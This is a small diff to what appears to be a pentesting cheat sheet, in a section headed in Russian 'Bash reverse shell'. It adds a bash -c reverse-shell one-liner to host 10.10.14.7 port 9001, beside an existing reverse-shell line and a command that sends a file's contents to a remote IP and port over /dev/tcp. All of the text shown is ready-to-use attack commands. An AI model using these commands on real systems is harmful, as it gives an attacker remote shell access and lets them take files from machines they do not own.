@@ -103,6 +103,8 @@ cifs - Common Internet File System
 # Обратная оболочка bash
 
     bash -i >& /dev/tcp/10.10.14.7/9001 0>&1 
+
+    bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'
     
     cat file > /dev/tcp/ip/port
     
